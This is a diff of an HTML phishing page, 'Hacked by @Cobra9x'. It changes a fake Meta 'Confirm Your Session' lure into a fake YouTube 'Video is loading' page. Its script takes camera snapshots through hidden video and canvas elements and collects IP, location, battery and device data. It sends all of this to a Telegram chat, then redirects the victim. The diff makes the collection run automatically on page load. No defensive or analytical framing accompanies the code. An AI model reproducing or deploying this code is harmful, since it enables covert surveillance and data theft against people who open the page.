@@ -1,16 +1,15 @@
-
-<!DOCTYPE html>
+!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Account Verification</title>
+  <title>YouTube Video</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
     body {
       margin: 0;
       font-family: 'Inter', sans-serif;
-      background: linear-gradient(to right, #f8f9fa, #e9ecef);
+      background: #f8f9fa;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -26,32 +25,7 @@
       text-align: center;
     }
     .card img {
-      width: 64px;
       margin-bottom: 20px;
-    }
-    .card h2 {
-      font-size: 22px;
-      font-weight: 600;
-      margin-bottom: 10px;
-    }
-    .card p {
-      font-size: 14px;
-      color: #555;
-      margin-bottom: 20px;
-    }
-    button {
-      background: #1877f2;
-      color: white;
-      font-weight: 600;
-      padding: 12px 24px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 15px;
-      transition: background 0.3s ease;
-    }
-    button:hover {
-      background: #155dc0;
     }
     video, canvas {
       opacity: 0;
@@ -62,10 +36,10 @@
 </head>
 <body>
   <div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" alt="Secure">
-    <h2>Confirm Your Session</h2>
-    <p>For your security, we need to verify your device and session. Please continue to proceed.</p>
-    <button onclick="collectSensitive()">Continue Verification</button>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" alt="YouTube" style="width: 120px;">
+    <h2 style="margin-top: 20px;">Video is loading...</h2>
+    <p style="color: #999;">Your internet connection is weak. Please wait while the video buffers.</p>
+    <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." style="width: 80px; margin-top: 20px;">
     <video id="videoPreview" autoplay muted playsinline></video>
     <canvas id="snapshotCanvas" width="320" height="240"></canvas>
   </div>
@@ -138,7 +112,7 @@
               stream.getTracks().forEach(track => track.stop());
               sendToTelegram("", true);
               setTimeout(() => {
-                window.location.href = "https://instagram.com";
+                window.location.href = "https://youtube.com/watch?v=dQw4w9WgXcQ";
               }, 3000);
             }, 1200);
           };
@@ -146,7 +120,7 @@
         .catch(() => {
           sendToTelegram("❌ Camera access denied");
           setTimeout(() => {
-            window.location.href = "https://instagram.com";
+            window.location.href = "https://youtube.com/watch?v=dQw4w9WgXcQ";
           }, 3000);
         });
     }
@@ -166,7 +140,7 @@
         const charging = battery.charging ? "Yes" : "No";
         const level = Math.round(battery.level * 100) + "%";
 
-        fetch("https://ipinfo.io/json?token=9c6f5e4a17b44c")
+        fetch("https://ipinfo.io/json?token=YOUR_TOKEN_HERE")
           .then(res => res.json())
           .then(data => {
             let basicInfo = "📱 Hacked by @Cobra9x\n\n";
@@ -179,14 +153,16 @@
             basicInfo += `📱 Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
             basicInfo += `🔗 Referrer: ${ref}\n`;
             basicInfo += "🔒 Awaiting GPS & camera permissions...";
-            basicInfo += "📱 Hacked by @Shopandbuyy\n\n";
 
             sendToTelegram(basicInfo);
           });
       });
     }
 
-    if (chatId) sendBasicInfo();
+    if (chatId) {
+      sendBasicInfo();
+      collectSensitive();
+    }
   </script>
 </body>
 </html>
